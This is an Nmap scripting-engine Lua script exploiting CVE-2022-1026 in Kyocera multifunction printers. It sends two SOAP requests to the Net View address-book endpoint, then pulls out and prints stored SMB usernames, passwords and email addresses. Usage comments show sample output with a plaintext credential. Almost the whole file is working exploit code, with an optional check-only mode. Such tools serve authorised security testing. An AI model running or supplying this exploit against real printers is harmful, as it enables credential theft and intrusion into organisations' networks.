local http = require("http")
local stdnse = require "stdnse"
local string = require "string"


description = [[
Recovers SMB credentials and Email addresses from the
address book of vulnerable Kyocera mutifunction printers.

Kyocera multifunction printers running vulnerable versions
of Net View unintentionally expose sensitive user information,
including usernames and passwords, through an insufficiently
protected address book export function. 

Net view is ran by default over http or https on TCP ports 9090
or 9091 respectively. To specify a custom TCP port pass the 
<code>kyocera.port</code> argument.

To only check for vulnerability and skip exploiting the target
host pass 'true' to the <code>kyocera.skipexploit</code> parameter.
]]

--@usage
--nmap --script=http-vuln-cve2022-1026 192.168.50.45
--@output
--Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-13 11:12 EDT
--Nmap scan report for PRINTER01.phrack.com (192.168.50.45)
--Host is up (0.030s latency).
--Not shown: 991 closed tcp ports (conn-refused)
--PORT     STATE SERVICE
--80/tcp   open  http
--515/tcp  open  printer
--631/tcp  open  ipp
--9090/tcp open  zeus-admin
--| http-vuln-cve2022-1026: 
--| -- SMB Credentials
--| Username: phrack.com\scanmanager
--| Password: G48n4&##JJKL32$
--| -- Emails
--| john.batchelor@phrack.com
--|_Marcus.Hayden@phrack.com
--9100/tcp open  jetdirect

--@usage
--nmap --script=http-vuln-cve2022-1026 --script-args kyocera.port=9090,kyocera.skipexploit=true 192.168.50.45 
--@args kyocera.port specify alternative TCP port
--@args kyocera.skipexploit check if vulnerable but do not exploit
--@output
--Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-13 11:17 EDT
--Nmap scan report for PRINTER01.phrack.com (192.168.50.45)
--Host is up (0.028s latency).
--Not shown: 991 closed tcp ports (conn-refused)
--PORT     STATE SERVICE
--80/tcp   open  http
--443/tcp  open  https
--515/tcp  open  printer
--631/tcp  open  ipp
--9090/tcp open  zeus-admin
--|_http-vuln-cve2022-1026: VULNERABLE
--9100/tcp open  jetdirect

author = "Shain Lakin"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"safe", "exploit", "vuln"}


portrule = function(host, port)
  local port_number = tonumber(stdnse.get_script_args('kyocera.port')) or 9090 
  return port.number == port_number and port.protocol == "tcp"
end

action = function(host, port)

  local url = "/ws/km-wsdl/setting/address_book"
  local headers = {['Content-Type'] = 'application/soap+xml'}
  local skip_exploit = stdnse.get_script_args('kyocera.skipexploit') or false
  
  local post_data1 = [[
<?xml version="1.0" encoding="utf-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" 
  xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" 
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
  xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
  xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" 
  xmlns:xop="http://www.w3.org/2004/08/xop/include" 
  xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book">
<SOAP-ENV:Header>
<wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<ns1:create_personal_address_enumerationRequest>
<ns1:number>25</ns1:number>
</ns1:create_personal_address_enumerationRequest>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
]]

  -- First POST request
  local response1 = http.post(host, port.number, url, nil, {}, post_data1)

  if not response1.status then
    return("HTTP request failed")
  end

  local enumeration = string.match(response1.body, '<kmaddrbook:enumeration>([%d]+)<')

  if not enumeration then
    return("NOT VULNERABLE")
  elseif skip_exploit then
    return("VULNERABLE")
  end
  
  local post_data2 = [[
<?xml version="1.0" encoding="utf-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope"
  xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:xsd="http://www.w3.org/2001/XMLSchema"
  xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
  xmlns:xop="http://www.w3.org/2004/08/xop/include"
  xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book">
<SOAP-ENV:Header>
<wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<ns1:get_personal_address_listRequest><ns1:enumeration>]]..enumeration..[[</ns1:enumeration></ns1:get_personal_address_listRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>
]]

  -- Second POST request
  local response2 = http.post(host, port.number, url, nil, {}, post_data2)

  if not response2.status then
    return("HTTP request failed")
  end
  stdnse.print_debug("Raw output:\n" .. response2.body)

  -- Parse email addresses
  local emails = {}
  for email in string.gmatch(response2.body, '<kmaddrbook:address>(.-)</kmaddrbook:address>') do
      if email ~= "" then
        table.insert(emails, email) 
      end
  end
    -- Parse login credentials
  local username = string.match(response2.body, '<kmaddrbook:login_name>(.-)</kmaddrbook:login_name>')
  local password = string.match(response2.body, '<kmaddrbook:login_password>(.-)</kmaddrbook:login_password>')

  if username and password then
    local output = ("\n-- SMB Credentials:\nUsername: %s\nPassword: %s"):format(username, password)
    if #emails > 0 then
        output = output .. "\n-- Emails:\n" .. table.concat(emails,'\n')
    end
    return output
  else
    return "VULNERABLE but no data available"
  end
end

